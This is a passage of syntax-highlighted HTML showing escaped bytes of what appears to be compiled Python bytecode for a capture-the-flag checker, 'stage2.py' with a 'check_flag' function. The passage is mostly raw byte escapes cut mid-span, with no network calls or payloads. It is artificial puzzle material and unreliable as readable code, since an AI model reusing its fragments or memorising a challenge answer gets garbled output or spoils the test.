class="se">\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00</span><span class="s">d</span><span class="se">\x04</span><span class="s">|</span><span class="se">\x01</span><span class="s">d,d</span><span class="se">\x1a\x1a\x00\xab\x02\x00\x00\x00\x00\x00\x00</span><span class="s">d</span><span class="se">\x05\x19\x00\x00\x00</span><span class="s">t</span><span class="se">\x05\x00\x00\x00\x00\x00\x00\x00\x00</span><span class="s">j</span><span class="se">\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00</span><span class="s">d</span><span class="se">\x04</span><span class="s">|</span><span class="se">\x01</span><span class="s">d</span><span class="se">\x1a</span><span class="s">d/</span><span class="se">\x1a\x00\xab\x02\x00\x00\x00\x00\x00\x00</span><span class="s">d</span><span class="se">\x05\x19\x00\x00\x00</span><span class="s">z</span><span class="se">\x06\x00\x00</span><span class="s">t</span><span class="se">\x05\x00\x00\x00\x00\x00\x00\x00\x00</span><span class="s">j</span><span class="se">\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00</span><span class="s">d</span><span class="se">\x04</span><span class="s">|</span><span class="se">\x01</span><span class="s">d</span><span class="se">\x1c</span><span class="s">d</span><span class="se">\x1e\x1a\x00\xab\x02\x00\x00\x00\x00\x00\x00</span><span class="s">d</span><span class="se">\x05\x19\x00\x00\x00</span><span class="s">z</span><span class="se">\x00\x00\x00</span><span class="s">d0k7</span><span class="se">\x00\x00</span><span class="s">r</span><span class="se">\x01</span><span class="s">y</span><span class="se">\x03</span><span class="s">t</span><span class="se">\x05\x00\x00\x00\x00\x00\x00\x00\x00</span><span class="s">j</span><span class="se">\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00</span><span class="s">d</span><span class="se">\x04</span><span class="s">|</span><span class="se">\x01</span><span class="s">d</span><span class="se">\x1a</span><span class="s">d/</span><span class="se">\x1a\x00\xab\x02\x00\x00\x00\x00\x00\x00</span><span class="s">d</span><span class="se">\x05\x19\x00\x00\x00</span><span class="s">t</span><span class="se">\x05\x00\x00\x00\x00\x00\x00\x00\x00</span><span class="s">j</span><span class="se">\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00</span><span class="s">d</span><span class="se">\x04</span><span class="s">|</span><span class="se">\x01</span><span class="s">d/d</span><span class="se">\x1d\x1a\x00\xab\x02\x00\x00\x00\x00\x00\x00</span><span class="s">d</span><span class="se">\x05\x19\x00\x00\x00</span><span class="s">z</span><span class="se">\x05\x00\x00</span><span class="s">t</span><span class="se">\x05\x00\x00\x00\x00\x00\x00\x00\x00</span><span class="s">j</span><span class="se">\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00</span><span class="s">d</span><span class="se">\x04</span><span class="s">|</span><span class="se">\x01</span><span class="s">d"d&amp;</span><span class="se">\x1a\x00\xab\x02\x00\x00\x00\x00\x00\x00</span><span class="s">d</span><span class="se">\x05\x19\x00\x00\x00</span><span class="s">z</span><span class="se">\x02\x00\x00</span><span class="s">d(k7</span><span class="se">\x00\x00</span><span class="s">r</span><span class="se">\x01</span><span class="s">y</span><span class="se">\x03</span><span class="s">t</span><span class="se">\x05\x00\x00\x00\x00\x00\x00\x00\x00</span><span class="s">j</span><span class="se">\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00</span><span class="s">d</span><span class="se">\x04</span><span class="s">|</span><span class="se">\x01</span><span class="s">d/d</span><span class="se">\x1d\x1a\x00\xab\x02\x00\x00\x00\x00\x00\x00</span><span class="s">d</span><span class="se">\x05\x19\x00\x00\x00</span><span class="s">t</span><span class="se">\x05\x00\x00\x00\x00\x00\x00\x00\x00</span><span class="s">j</span><span class="se">\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00</span><span class="s">d</span><span class="se">\x04</span><span class="s">|</span><span class="se">\x01</span><span class="s">d</span><span class="se">\x1d</span><span class="s">d1</span><span class="se">\x1a\x00\xab\x02\x00\x00\x00\x00\x00\x00</span><span class="s">d</span><span class="se">\x05\x19\x00\x00\x00</span><span class="s">z</span><span class="se">\n\x00\x00</span><span class="s">t</span><span class="se">\x05\x00\x00\x00\x00\x00\x00\x00\x00</span><span class="s">j</span><span class="se">\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00</span><span class="s">d</span><span class="se">\x04</span><span class="s">|</span><span class="se">\x01</span><span class="s">d</span><span class="se">\x1a</span><span class="s">d/</span><span class="se">\x1a\x00\xab\x02\x00\x00\x00\x00\x00\x00</span><span class="s">d</span><span class="se">\x05\x19\x00\x00\x00</span><span class="s">z</span><span class="se">\n\x00\x00</span><span class="s">d2k7</span><span class="se">\x00\x00</span><span class="s">r</span><span class="se">\x01</span><span class="s">y</span><span class="se">\x03</span><span class="s">t</span><span class="se">\x05\x00\x00\x00\x00\x00\x00\x00\x00</span><span class="s">j</span><span class="se">\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00</span><span class="s">d</span><span class="se">\x04</span><span class="s">|</span><span class="se">\x01</span><span class="s">d</span><span class="se">\x1d</span><span class="s">d1</span><span class="se">\x1a\x00\xab\x02\x00\x00\x00\x00\x00\x00</span><span class="s">d</span><span class="se">\x05\x19\x00\x00\x00</span><span class="s">t</span><span class="se">\x05\x00\x00\x00\x00\x00\x00\x00\x00</span><span class="s">j</span><span class="se">\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00</span><span class="s">d</span><span class="se">\x04</span><span class="s">|</span><span class="se">\x01</span><span class="s">d1d</span><span class="se">\x02\x1a\x00\xab\x02\x00\x00\x00\x00\x00\x00</span><span class="s">d</span><span class="se">\x05\x19\x00\x00\x00</span><span class="s">z</span><span class="se">\x00\x00\x00</span><span class="s">t</span><span class="se">\x05\x00\x00\x00\x00\x00\x00\x00\x00</span><span class="s">j</span><span class="se">\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00</span><span class="s">d</span><span class="se">\x04</span><span class="s">|</span><span class="se">\x01</span><span class="s">d1d</span><span class="se">\x02\x1a\x00\xab\x02\x00\x00\x00\x00\x00\x00</span><span class="s">d</span><span class="se">\x05\x19\x00\x00\x00</span><span class="s">z</span><span class="se">\x05\x00\x00</span><span class="s">d3k7</span><span class="se">\x00\x00</span><span class="s">r</span><span class="se">\x01</span><span class="s">y</span><span class="se">\x03</span><span class="s">y4)5Nz</span><span class="se">\x05</span><span class="s">utf-8</span><span class="se">\xe9\x1d\x00\x00\x00</span><span class="s">F</span><span class="se">\xda\x01</span><span class="s">Br</span><span class="se">\x02\x00\x00\x00\xe9\x01\x00\x00\x00\xe9\x02\x00\x00\x00\xe9\xd2\x00\x00\x00\xe9\x03\x00\x00\x00\xe9\x0b\x00\x00\x00\xe9\x04\x00\x00\x00\xe9\x06\x00\x00\x00\xe9\x05\x00\x00\x00</span><span class="s">i}1</span><span class="se">\x00\x00\xe9</span><span class="s">p</span><span class="se">\x00\x00\x00\xe9\x07\x00\x00\x00\xe9</span><span class="s">?</span><span class="se">\x00\x00\x00\xe9</span><span class="s">)</span><span class="se">\x00\x00\x00\xe9\x08\x00\x00\x00</span><span class="s">i</span><span class="se">\xda\x01\x00\x00\xe9\t\x00\x00\x00\xe9\n\x00\x00\x00\xe9\x11\x00\x00\x00</span><span class="s">ip</span><span class="se">\x03\x00\x00\xe9\x0c\x00\x00\x00\xe9\x19\x00\x00\x00\xe9\r\x00\x00\x00\xe9\x0e\x00\x00\x00\xe9\x1b\x00\x00\x00\xe9\x0f\x00\x00\x00\xe9</span><span class="s">H</span><span class="se">\x00\x00\x00\xe9</span><span class="s">;</span><span class="se">\x00\x00\x00\xe9\x10\x00\x00\x00\xe9\x13\x00\x00\x00\xe9\x12\x00\x00\x00</span><span class="s">i</span><span class="se">\xb5\xff\xff\xff</span><span class="s">i</span><span class="se">\x7f\x0e\x00\x00\xe9\x14\x00\x00\x00\xe9\x15\x00\x00\x00\xe9</span><span class="s">!</span><span class="se">\x00\x00\x00\xe9\x16\x00\x00\x00\xe9\x17\x00\x00\x00\xe9\xeb\x00\x00\x00\xe9\x18\x00\x00\x00</span><span class="s">i&gt;</span><span class="se">\xd9\xff\xff\xe9</span><span class="s">_</span><span class="se">\x00\x00\x00\xe9\x1a\x00\x00\x00\xe9\xc2\x00\x00\x00\xe9\x1c\x00\x00\x00</span><span class="s">iO</span><span class="se">\xff\xff\xff</span><span class="s">i</span><span class="se">\xbf</span><span class="s">r</span><span class="se">\x00\x00</span><span class="s">T)</span><span class="se">\x04\xda\x06</span><span class="s">encode</span><span class="se">\xda\x03</span><span class="s">len</span><span class="se">\xda\x06</span><span class="s">struct</span><span class="se">\xda\x06</span><span class="s">unpack)</span><span class="se">\x02\xda\x04</span><span class="s">flag</span><span class="se">\xda\n</span><span class="s">flag_bytess</span><span class="se">\x02\x00\x00\x00</span><span class="s">  </span><span class="se">\xfa\x0b</span><span class="s">.</span><span class="se">\\</span><span class="s">stage2.py</span><span class="se">\xda\n</span><span class="s">check_flagr4</span><span class="se">\x00\x00\x00\x03\x00\x00\x00</span><span class="s">s</span><span class="se">\x1a\x0b\x00\x00\x80\x00\xd8\x11\x15\x97\x1b\x91\x1b\x98</span><span class="s">W</span><span class="se">\xd3\x11</span><span class="s">%</span><span class="se">\x80</span><span class="s">J</span><span class="se">\xe4\x07\n\x88</span><span class="s">:</span><span class="se">\x83\x7f\x98</span><span class="s">"</span><span class="se">\xd2\x07\x1c\xd8\x0f\x14\xe4\x07\r\x87</span><span class="s">}</span><span class="se">\x81</span><span class="s">}</span><span class="se">\x90</span><span class="s">S</span><span class="se">\x98</span><span class="s">*</span><span class="se">\xa0</span><span class="s">Q</span><span class="se">\xa0</span><span class="s">q</span><span class="se">\x98</span><span class="s">/</span><span class="se">\xd3\x07</span><span class="s">*</span><span class="se">\xa8</span><span class="s">1</span><span class="se">\xd1\x07</span><span class="s">-</span><span class="se">\xb4\x06\xb7\r\xb1\r\xb8</span><span class="s">c</span><span class="se">\xc0</span><span class="s">:</span><span class="se">\xc8</span><span class="s">a</span><span class="se">\xd0</span><span class="s">PQ</span><span class="se">\xc0</span><span class="s">?</span><span class="se">\xd3</span><span class="s">0S</span><span class="se">\xd0</span><span class="s">TU</span><span class="se">\xd1</span><span class="s">0V</span><span class="se">\xd1\x07</span><span class="s">V</span><span class="se">\xd0</span><span class="s">Z]</span><span class="se">\xd2\x07</span><span class="s">]</span><span class="se">\xd8\x0f\x14\xdc\x07\r\x87</span><span class="s">}</span><span class="se">\x81</span><span class="s">}</span><span class="se">\x90</span><span class="s">S</span><span class="se">\x98</span><span class="s">*</span><span class="se">\xa0</span><span class="s">Q</span><span class="se">\xa0</span><span class="s">q</span><span class="se">\x98</span><span class="s">/</span><span class="se">\xd3\x07</span><span class="s">*</span><span class="se">\xa8</span><span class="s">1</span><span class="se">\xd1\x07</span><span class="s">-</span><span class="se">\xb4\x06\xb7\r\xb1\r\xb8</span><span class="s">c</span><span class="se">\xc0</span><span class="s">:</span><span class="se">\xc8</span><span class="s">a</span><span class="se">\xd0</span><span class="s">PQ</span><span class="se">\xc0</span><span class="s">?</span><span class="se">\xd3</span><span class="s">0S</span><span class="se">\xd0</span><span class="s">TU</span><span class="se">\xd1</span><span class="s">0V</span><span class="se">\xd1\x07</span><span class="s">V</span><span class="se">\xd0</span><span class="s">Z</span><span class="se">\\\xd2\x07\\\xd8\x0f\x14\xdc\x07\r\x87</span><span class="s">}</span><span class="se">\x81</span><span class="s">}</span><span class="se">\x90</span><span class="s">S</span><span class="se">\x98</span><span class="s">*</span><span class="se">\xa0</span><span class="s">Q</span><span class="se">\xa0</span><span class="s">q</span><span class="se">\x98</span><span class="s">/</span><span class="se">\xd3\x07</span><span class="s">*</span><span class="se">\xa8</span><span class="s">1</span><span class="se">\xd1\x07</span><span class="s">-</span><span class="se">\xb4\x06\xb7\r\xb1\r\xb8</span><span class="s">c</span><span class="se">\xc0</span><span class="s">:</span><span class="se">\xc8</span><span class="s">a</span><span class="se">\xd0</span><span class="s">PQ</span><span class="se">\xc0</span><span class="s">?</span><span class="se">\xd3</span><span class="s">0S</span><span class="se">\xd0</span><span class="s">TU</span><span class="se">\xd1</span><span class="s">0V</span><span class="se">\xd1\x07</span><span class="s">V</span><span class="se">\xd0</span><span class="s">Z]</span><span class="se">\xd2\x07</span><span class="s">]</span><span class="se">\xd8\x0f\x14\xdc\x07\r\x87</span><span class="s">}</span><span class="se">\x81</span><span class="s">}</span><span class="se">\x90</span><span class="s">S</span><span class="se">\x98</span><span class="s">*</span><span class="se">\xa0</span><span class="s">Q</span><span class="se">\xa0</span><span class="s">q</span><span class="se">\x98</span><span class="s">/</span><span class="se">\xd3\x07</span><span class="s">*</span><span class="se">\xa8</span><span class="s">1</span><span class="se">\xd1\x07</span><span class="s">-</span><span class="se">\xb4\x06\xb7\r\xb1\r\xb8</span><span class="s">c</span><span class="se">\xc0</span><span class="s">:</span><span class="se">\xc8</span><span class="s">a</span><span class="se">\xd0</span><span class="s">PQ</span><span class="se">\xc0</span><span class="s">?</span><span class="se">\xd3</span><span class="s">0S</span><span class="se">\xd0</span><span class="s">TU</span><span class="se">\xd1</span><span class="s">0V</span><span class="se">\xd1\x07</span><span class="s">V</span><span class="se">\xd0</span><span class="s">Z_</span><span class="se">\xd2\x07</span><span class="s">_</span><span class="se">\xd8\x0f\x14\xdc\x07\r\x87</span><span class="s">}</span><span class="se">\x81</span><span class="s">}</span><span class="se">\x90</span><span class="s">S</span><span class="se">\x98</span><span class="s">*</span><span class="se">\xa0</span><span class="s">Q</span><span class="se">\xa0</span><span class="s">q</span><span class="se">\x98</span><span class="s">/</span><span class="se">\xd3\x07</span><span class="s">*</span><span class="se">\xa8</span><span class="s">1</span><span class="se">\xd1\x07</span><span class="s">-</span><span class="se">\xb4\x06\xb7\r\xb1\r\xb8</span><span class="s">c</span><span class="se">\xc0</span><span class="s">:</span><span class="se">\xc8</span><span class="s">a</span><span class="se">\xd0</span><span class="s">PQ</span><span class="se">\xc0</span><span class="s">?</span><span class="se">\xd3</span><span class="s">0S</span><span class="se">\xd0</span><span class="s">TU</span><span class="se">\xd1</span><span class="s">0V</span><span class="se">\xd1\x07</span><span class="s">V</span><span class="se">\xd0</span><span class="s">Z]</span><span class="se">\xd2\x07</span><span class="s">]</span><span class="se">\xd8\x0f\x14\xdc\x08\x0e\x8f\r\x89\r\x90</span><span class="s">c</span><span class="se">\x98</span><span class="s">:</span><span class="se">\xa0</span><span class="s">a</span><span class="se">\xa8\x01\x98</span><span class="s">?</span><span class="se">\xd3\x08</span><span class="s">+</span><span class="se">\xa8</span><span class="s">A</span><span class="se">\xd1\x08</span><span class="s">.</span><span class="se">\xb4\x16\xb7\x1d\xb1\x1d\xb8</span><span class="s">s</span><span class="se">\xc0</span><span class="s">J</span><span class="se">\xc8</span><span class="s">q</span><span class="se">\xd0</span><span class="s">QR</span><span class="se">\xc0</span><span class="s">O</span><span class="se">\xd3</span><span class="s">1T</span><span class="se">\xd0</span><span class="s">UV</span><span class="se">\xd1</span><span class="s">1W</span><span class="se">\xd1\x08</span><span class="s">W</span><span class="se">\xd0</span><span class="s">[_</span><span class="se">\xd1\x07</span><span class="s">_</span><span class="se">\xd0</span><span class="s">ce</span><span class="se">\xd2\x07</span><span class="s">e</span><span class="se">\xd8\x0f\x14\xdc\x08\x0e\x8f\r\x89\r\x90</span><span class="s">c</span><span class="se">\x98</span><span class="s">:</span><span class="se">\xa0</span><span class="s">a</span><span class="se">\xa8\x01\x98</span><span class="s">?</span><span class="se">\xd3\x08</span><span class="s">+</span><span class="se">\xa8</span><span class="s">A</span><span class="se">\xd1\x08</span><span class="s">.</span><span class="se">\xb4\x16\xb7\x1d\xb1\x1d\xb8</span><span class="s">s</span><span class="se">\xc0</span><span class="s">J</span><span class="se">\xc8</span><span class="s">q</span><span class="se">\xd0</span><span class="s">QR</span><span class="se">\xc0</span><span class="s">O</span><span class="se">\xd3</span><span class="s">1T</span><span class="se">\xd0</span><span class="s">UV</span><span class="se">\xd1</span><span class="s">1W</span><span class="se">\xd1\x08</span><span class="s">W</span><span class="se">\xd0\\</span><span class="s">]</span><span class="se">\xd1\x07</span><span class="s">]</span><span class="se">\xd0</span><span class="s">ad</span><span class="se">\xd2\x07</span><span class="s">d</span><span class="se">\xd8\x0f\x14\xdc\x08\x0e\x8f\r\x89\r\x90</span><span class="s">c</span><span class="se">\x98</span><span class="s">:</span><span class="se">\xa0</span><span class="s">a</span><span class="se">\xa8\x01\x98</span><span class="s">?</span><span class="se">\xd3\x08</span><span class="s">+</span><span class="se">\xa8</span><span class="s">A</span><span class="se">\xd1\x08</span><span class="s">.</span><span class="se">\xb4\x16\xb7\x1d\xb1\x1d\xb8</span><span class="s">s</span><span class="se">\xc0</span><span class="s">J</span><span class="se">\xc8</span><span class="s">q</span><span class="se">\xd0</span><span class="s">QR</span><span class="se">\xc0</span><span class="s">O</span><span class="se">\xd3</span><span class="s">1T</span><span class="se">\xd0</span><span class="s">UV</span><span class="se">\xd1</span><span class="s">1W</span><span class="se">\xd1\x08</span><span class="s">W</span><span class="se">\xd0\\</span><span class="s">]</span><span class="se">\xd1\x07</span><span class="s">]</span><span class="se">\xd0</span><span class="s">ab</span><span class="se">\xd2\x07</span><span class="s">b</span><span class="se">\xd8\x0f\x14\xdc\x08\x0e\x8f\r\x89\r\x90</span><span class="s">c</span><span class="se">\x98</span><span class="s">:</span><span class="se">\xa0</span><span class="s">a</span><span class="se">\xa8\x01\x98</span><span class="s">?</span><span class="se">\xd3\x08</span><span class="s">+</span><span class="se">\xa8</span><span class="s">A</span><span class="se">\xd1\x08</span><span class="s">.</span><span class="se">\xb4\x16\xb7\x1d\xb1\x1d\xb8</span><span class="s">s</span><span class="se">\xc0</span><span class="s">J</span><span class="se">\xc8</span><span class="s">q</span><span class="se">\xd0</span><span class="s">QS</span><span class="se">\xd0</span><span class="s">DT</span><span class="se">\xd3</span><span class="s">1U</span><span class="se">\xd0</span><span class="s">VW</span><span class="se">\xd1</span><span class="s">1X</span><span class="se">\xd1\x08</span><span class="s">X</span><span class="se">\xd0</span><span class="s">]^</span><span class="se">\xd1\x07</span><span class="s">^</span><span class="se">\xd0</span><span class="s">bd</span><span class="se">\xd2\x07</span><span class="s">d</span><span class="se">\xd8\x0f\x14\xdc\x08\x0e\x8f\r\x89\r\x90</span><span class="s">c</span><span class="se">\x98</span><span class="s">:</span><span class="se">\xa0</span><span class="s">a</span><span class="se">\xa8\x02\xd0\x1b</span><span class="s">+</span><span class="se">\xd3\x08</span><span class="s">,</span><span class="se">\xa8</span><span class="s">Q</span><span class="se">\xd1\x08</span><span class="s">/</span><span class="se">\xb4</span><span class="s">&amp;</span><span class="se">\xb7</span><span class="s">-</span><span class="se">\xb1</span><span class="s">-</span><span class="se">\xc0\x03\xc0</span><span class="s">Z</span><span class="se">\xd0</span><span class="s">PR</span><span class="se">\xd0</span><span class="s">SU</span><span class="se">\xd0</span><span class="s">EV</span><span class="se">\xd3</span><span class="s">2W</span><span class="se">\xd0</span><span class="s">XY</span><span class="se">\xd1</span><span class="s">2Z</span><span class="se">\xd1\x08</span><span class="s">Z</span><span class="se">\xd0</span><span class="s">_`</span><span class="se">\xd1\x07</span><span class="s">`</span><span class="se">\xd0</span><span class="s">dg</span><span class="se">\xd2\x07</span><span class="s">g</span><span class="se">\xd8\x0f\x14\xdc\x08\x0e\x8f\r\x89\r\x90</span><span class="s">c</span><span class="se">\x98</span><span class="s">:</span><span class="se">\xa0</span><span class="s">b</span><span class="se">\xa8\x12\xd0\x1b</span><span class="s">,</span><span class="se">\xd3\x08</span><span class="s">-</span><span class="se">\xa8</span><span class="s">a</span><span class="se">\xd1\x08</span><span class="s">0</span><span class="se">\xb4</span><span class="s">6</span><span class="se">\xb7</span><span class="s">=</span><span class="se">\xb1</span><span class="s">=</span><span class="se">\xc0\x13\xc0</span><span class="s">j</span><span class="se">\xd0</span><span class="s">QS</span><span class="se">\xd0</span><span class="s">TV</span><span class="se">\xd0</span><span class="s">FW</span><span class="se">\xd3</span><span class="s">3X</span><span class="se">\xd0</span><span class="s">YZ</span><span class="se">\xd1</span><span class="s">3[</span><span class="se">\xd1\x08</span><span class="s">[</span><span class="se">\xd0</span><span class="s">`a</span><span class="se">\xd1\x07</span><span class="s">a</span><span class="se">\xd0</span><span class="s">eg</span><span class="se">\xd2\x07</span><span class="s">g</span><span class="se">\xd8\x0f\x14\xdc\x08\x0e\x8f\r\x89\r\x90</span><span class="s">c</span><span class="se">\x98</span><span class="s">:</span><span class="se">\xa0</span><span class="s">b</span><span class="se">\xa8\x12\xd0\x1b</span><span class="s">,</span><span class="se">\xd3\x08</span><span class="s">-</span><span class="se">\xa8</span><span class="s">a</span><span class="se">\xd1\x08</span><span class="s">0</span><span class="se">\xb4</span><span class="s">6</span><span class="se">\xb7</span><span class="s">=</span><span class="se">\xb1</span><span class="s">=</span><span class="se">\xc0\x13\xc0</span><span class="s">j</span><span class="se">\xd0</span><span class="s">QS</span><span class="se">\xd0</span><span class="s">TV</span><span class="se">\xd0</span><span class="s">FW</span><span class="se">\xd3</span><span class="s">3X</span><span class="se">\xd0</span><span class="s">YZ</span><span class="se">\xd1</span><span class="s">3[</span><span class="se">\xd1\x08</span><span class="s">[</span><span class="se">\xd0</span><span class="s">`a</span><span class="se">\xd1\x07</span><span class="s">a</span><span class="se">\xd0</span><span class="s">eg</span><span class="se">\xd2\x07</span><span class="s">g</span><span class="se">\xd8\x0f\x14\xdc\x08\x0e\x8f\r\x89\r\x90</span><span class="s">c</span><span class="se">\x98</span><span class="s">:</span><span class="se">\xa0</span><span class="s">b</span><span class="se">\xa8\x12\xd0\x1b</span><span class="s">,</span><span class="se">\xd3\x08</span><span class="s">-</span><span class="se">\xa8</span><span class="s">a</span><span class="se">\xd1\x08</span><span class="s">0</span><span class="se">\xb4</span><span class="s">6</span><span class="se">\xb7</span><span class="s">=</span><span class="se">\xb1</span><span class="s">=</span><span class="se">\xc0\x13\xc0</span><span class="s">j</span><span class="se">\xd0</span><span class="s">QS</span><span class="se">\xd0</span><span class="s">TV</span><span class="se">\xd0</span><span class="s">FW</span><span class="se">\xd3</span><span class="s">3X</span><span class="se">\xd0</span><span class="s">YZ</span><span class="se">\xd1</span><span class="s">3[</span><span class="se">\xd1\x08</span><span class="s">[</span><span class="se">\xd0</span><span class="s">_a</span><span class="se">\xd1\x07</span><span class="s">a</span><span class="se">\xd0</span><span class="s">eg</span><span class="se">\xd2\x07</span><span class="s">g</span><span class="se">\xd8\x0f\x14\xdc\x08\x0e\x8f\r\x89\r\x90</span><span class="s">c</span><span class="se">\x98</span><span class="s">:</span><span class="se">\xa0</span><span class="s">b</span><span class="se">\xa8\x12\xd0\x1b</span><span class="s">,</span><span class="se">\xd3\x08</span><span class="s">-</span><span class="se">\xa8</span><span class="s">a</span><span class="se">\xd1\x08</span><span class="s">0</span><span class="se">\xb4</span><span class="s">6</span><span class="se">\xb7</span><span class="s">=</span><span class="se">\xb1</span><span class="s">=</span><span class="se">\xc0\x13\xc0</span><span class="s">j</span><span class="se">\xd0</span><span class="s">QS</span><span class="se">\xd0</span><span class="s">TV</span><span class="se">\xd0</span><span class="s">FW</span><span class="se">\xd3</span><span class="s">3X</span><span class="se">\xd0</span><span class="s">YZ</span><span class="se">\xd1</span><span class="s">3[</span><span class="se">\xd1\x08</span><span class="s">[</span><span class="se">\xd0</span><span class="s">_a</span><span class="se">\xd1\x07</span><span class="s">a</span><span class="se">\xd0</span><span class="s">eg</span><span class="se">\xd2\x07</span><span class="s">g</span><span class="se">\xd8\x0f\x14\xdc\x08\x0e\x8f\r\x89\r\x90</span><span class="s">c</span><span class="se">\x98</span><span class="s">:</span><span class="se">\xa0</span><span class="s">b</span><span class="se">\xa8\x12\xd0\x1b</span><span class="s">,</span><span class="se">\xd3\x08</span><span class="s">-</span><span class="se">\xa8</span><span class="s">a</span><span class="se">\xd1\x08</span><span class="s">0</span><span class="se">\xb4</span><span class="s">6</span><span class="se">\xb7</span><span class="s">=</span><span class="se">\xb1</span><span class="s">=</span><span class="se">\xc0\x13\xc0</span><span class="s">j</span><span class="se">\xd0</span><span class="s">QS</span><span class="se">\xd0</span><span class="s">TV</span><span class="se">\xd0</span><span class="s">FW</span><span class="se">\xd3</span><span class="s">3X</span><span class="se">\xd0</span><span class="s">YZ</span><span class="se">\xd1</span><span class="s">3[</span><span class="se">\xd1\x08</span><span class="s">[</span><span class="se">\xd4</span><span class="s">_e</span><span class="se">\xd7</span><span class="s">_l</span><span class="se">\xd1</span><span class="s">_l</span><span class="se">\xd0</span><span class="s">mp</span><span class="se">\xd0</span><span class="s">r|</span><span class="se">\xd0</span><span class="s">}~</span><span class="se">\xf0\x00\x00</span><span class="s">@</span><span class="se">\x02</span><span class="s">A</span><span class="se">\x02\xf0\x00\x00</span><span class="s">s</span><span class="se">\x01</span><span class="s">B</span><span class="se">\x02\xf3\x00\x00</span><span class="s">`</span><span class="se">\x01</span><span class="s">C</span><span class="se">\x02\xf0\x00\x00</span><span class="s">D</span><span class="se">\x02</span><span class="s">E</span><span class="se">\x02\xf1\x00\x00</span><span class="s">`</span><span class="se">\x01</span><span class="s">F</span><span class="se">\x02\xf1\x00\x00\x08</span><span class="s">F</span><span class="se">\x02\xf0\x00\x00</span><span class="s">J</span><span class="se">\x02</span><span class="s">L</span><span class="se">\x02\xf2\x00\x00\x08</span><span class="s">L</span><span class="se">\x02\xd8\x0f\x14\xdc\x08\x0e\x8f\r\x89\r\x90</span><span class="s">c</span><span class="se">\x98</span><span class="s">:</span><span class="se">\xa0</span><span class="s">b</span><span class="se">\xa8\x12\xd0\x1b</span><span class="s">,</span><span class="se">\xd3\x08</span><span class="s">-</span><span class="se">\xa8</span><span class="s">a</span><span class="se">\xd1\x08</span><span class="s">0</span><span class="se">\xb4</span><span class="s">6</span><span class="se">\xb7</span><span class="s">=</span><span class="se">\xb1</span><span class="s">=</span><span class="se">\xc0\x13\xc0</span><span class="s">j</span><span class="se">\xd0</span><span class="s">QS</span><span class="se">\xd0</span><span class="s">TV</span><span class="se">\xd0</span><span class="s">FW</span><span class="se">\xd3</span><span class="s">3X</span><span class="se">\xd0</span><span class="s">YZ</span><span class="se">\xd1</span><span class="s">3[</span><span class="se">\xd1\x08</span><span class="s">[</span><span class="se">\xd4</span><span class="s">_e</span><span class="se">\xd7</span><span class="s">_l</span><span class="se">\xd1</span><span class="s">_l</span><span class="se">\xd0</span><span class="s">mp</span><span class="se">\xd0</span><span class="s">r|</span><span class="se">\xd0</span><span class="s">}~</span><span class="se">\xf0\x00\x00</span><span class="s">@</span><span class="se">\x02</span><span class="s">A</span><span class="se">\x02\xf0\x00\x00</span><span class="s">s</span><span class="se">\x01</span><span class="s">B</span><span class="se">\x02\xf3\x00\x00</span><span class="s">`</span><span class="se">\x01</span><span class="s">C</span><span class="se">\x02\xf0\x00\x00</span><span class="s">D</span><span class="se">\x02</span><span class="s">E</span><span class="se">\x02\xf1\x00\x00</span><span class="s">`</span><span class="se">\x01</span><span class="s">F</span><span class="se">\x02\xf1\x00\x00\x08</span><span class="s">F</span><span class="se">\x02\xf0\x00\x00</span><span class="s">J</span><span class="se">\x02</span><span class="s">L</span><span class="se">\x02\xf2\x00\x00\x08</span><span class="s">L</span><span class="se">\x02\xd8\x0f\x14\xdc\x08\x0e\x8f\r\x89\r\x90</span><span class="s">c</span><span class="se">\x98</span><span class="s">:</span><span class="se">\xa0</span><span class="s">b</span><span class="se">\xa8\x12\xd0\x1b</span><span class="s">,</span><span class="se">\xd3\x08</span><span class="s">-</span><span class="se">\xa8</span><span class="s">a</span><span class="se">\xd1\x08</span><span class="s">0</span><span class="se">\xb4</span><span class="s">6</span><span class="se">\xb7</span><span class="s">=</span><span class="se">\xb1</span><span class="s">=</span><span class="se">\xc0\x13\xc0</span><span class="s">j</span><span class="se">\xd0</span><span class="s">QS</span><span class="se">\xd0</span><span class="s">TV</span><span class="se">\xd0</span><span class="s">FW</span><span class="se">\xd3</span><span class="s">3X</span><span class="se">\xd0</span><span class="s">YZ</span><span class="se">\xd1</span><span class="s">3[</span><span class="se">\xd1\x08</span><span class="s">[</span><span class="se">\xd4</span><span class="s">_e</span><span class="se">\xd7</span><span class="s">_l</span><span class="se">\xd1</span><span class="s">_l</span><span class="se">\xd0</span><span class="s">mp</span><span class="se">\xd0</span><span class="s">r|</span><span class="se">\xd0</span><span class="s">}~</span><span class="se">\xf0\x00\x00</span><span class="s">@</span><span class="se">\x02</span><span class="s">A</span><span class="se">\x02\xf0\x00\x00</span><span class="s">s</span><span class="se">\x01</span><span class="s">B</span><span class="se">\x02\xf3\x00\x00</span><span class="s">`</span><span class="se">\x01</span><span class="s">C</span><span class="se">\x02\xf0\x00\x00</span><span class="s">D</span><span class="se">\x02</span><span class="s">E</span><span class="se">\x02\xf1\x00\x00</span><span class="s">`</span><span class="se">\x01</span><span class="s">F</span><span class="se">\x02\xf1\x00\x00\x08</span><span class="s">F</span><span class="se">\x02\xf0\x00\x00</span><span class="s">J</span><span class="se">\x02</span><span class="s">M</span><span class="se">\x02\xf2\x00\x00\x08</span><span class="s">M</span><span 